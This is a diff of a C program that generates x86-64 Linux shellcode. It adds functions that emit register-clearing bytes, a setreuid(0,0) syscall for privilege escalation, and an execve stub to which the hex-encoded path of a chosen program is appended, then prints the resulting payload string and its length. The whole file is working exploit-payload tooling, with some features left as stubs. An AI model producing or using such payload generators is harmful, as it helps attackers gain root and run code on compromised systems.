@@ -50,46 +50,120 @@ down:
 ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
  */
 
-#include <stdio.h>
-#include <string.h>
-#define LEN_SKELETON 165
- 
+#include "main.h"
+
+
+void cleanRegs(char *shellcode)
+{
+	snprintf(shellcode, LEN_CLEAN_REGS, (unsigned char *)"\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48\\x31\\xd2");
+}
+
+void privEsc(char *shellcode, int uid[])
+{
+	if(!uid[0] && !uid[1])
+	{
+		snprintf(&shellcode[strlen(shellcode)], LEN_SETREUID, (unsigned char*)"\\xb0\\x71\\x0f\\x05");
+	}
+	else
+	{
+		//Coming soon..
+	}
+}
+
+void makeExec(char *shellcode, char *program, size_t size)
+{
+	snprintf(&shellcode[strlen(shellcode)], LEN_EXECVE, (unsigned char *) "\\x48\\x31\\xc0\\xeb\\x0f\\x5f\\x50\\x48"
+																			"\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83"
+																			"\\xc0\\x3b\\x0f\\x05\\xe8\\xec\\xff\\xff\\xff");
+	strncat(shellcode, program, size);
+}
+
+
+void usage(){}//Coming soon
+
+void banner(){}//Coming soon
+
+
+
 int main(int argc, char **argv)
 {
-	int i;
-	size_t len;
-	
-	if(argc < 2)
+	int i, c, p = 0, u = 0, uid[] = {0,0};
+	char srArgs[LEN_UIDS];
+	size_t lenProgr;
+	unsigned char *program, *shellcode;
+
+	banner();
+	if(argc < 2){usage();}
+
+	while((c = getopt(argc, argv, ":p:u:")) != -1)
 	{
-		printf("Usage:%s </path/to/bin>\n",argv[0]);
-		return 1;
+		switch(c)
+		{
+			case 'p':
+						p = 1;
+						lenProgr = strlen(optarg) * 4;
+						program = (unsigned char*) malloc(sizeof(unsigned char)*lenProgr+1);
+						memset(program,0x0, sizeof(unsigned char)*lenProgr+1);
+						
+						for(i=0; i < lenProgr/4; i++)
+  						{
+							snprintf(&program[i*4], (sizeof(unsigned char)*lenProgr+1)-(i*4),"\\x%02x", (unsigned char*)optarg[i]);
+						}
+
+						program[lenProgr] = '\0';
+						break;
+			
+			case 'u':
+						u = 1;
+
+						strncpy(srArgs,optarg, LEN_UIDS);
+						srArgs[strlen(srArgs)] = '\0';
+						char *ptr;
+						if(!strcmp(srArgs,"root"))
+						{
+							break;
+						}
+						else if(strstr(srArgs,",") == NULL){usage();}
+						
+						strtok_r(srArgs, ",", &ptr);
+						uid[0] = atoi(srArgs);
+						uid[1] = atoi(ptr);
+						break;
+			default:
+						usage();
+						break;
+		}
 	}
-	
-	len = strlen(argv[1]);
-	unsigned char shellcode[LEN_SKELETON + len*4 + 1];
-	unsigned char program[len*4+1];
-	
-	snprintf(shellcode, LEN_SKELETON, "\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x31\\xf6\\x48"
-					  "\\x31\\xd2\\xb0\\x71\\x0f\\x05\\x48\\x31\\xc0\\xeb"
-					  "\\x0f\\x5f\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6"
-					  "\\x48\\x83\\xc0\\x3b\\x0f\\x05\\xe8\\xec\\xff\\xff\\xff");
- 	for(i=0;i<len;i++)
-  	{
-		//it copies hex values of argv[1] chars into the program buffer
-  		snprintf(&program[i*4], sizeof(program)-(i*4),"\\x%02x", (unsigned char*)argv[1][i]);
-  	}		
-
-  	len *= 4;
-  
-  	program[len] = '\0';	
-	//We simply append argv[1] to our skeleton shellcode (in other words we call the execve with argv[1] as argument)
-	strncat(shellcode, program, len);
-	
-	shellcode[LEN_SKELETON + len]='\0';
-	
-	printf("\"%s\"\nLength: %d\n", shellcode, (LEN_SKELETON + len)/4);
-	
-	return 0;
 
 
+
+	if(!p){usage();}
+	
+
+	shellcode = (unsigned char*) malloc(sizeof(unsigned char)*(LEN_CLEAN_REGS + LEN_EXECVE + lenProgr + 1));
+	
+	if(shellcode == NULL)
+	{
+		printf("Error\n");
+		exit(EXIT_FAILURE);
+	}
+
+	memset(shellcode,0x0,sizeof(unsigned char)*(LEN_CLEAN_REGS + LEN_EXECVE + lenProgr + 1));
+
+	if(u)
+	{
+		cleanRegs(shellcode);
+		privEsc(shellcode, uid);
+	}
+
+	makeExec(shellcode, program, lenProgr);
+	
+	printf("\"%s\"\nLen: %u\n", shellcode, strlen(shellcode)/4);
+
+	free(program);
+	free(shellcode);
+	exit(EXIT_SUCCESS);
 }
+
+
+
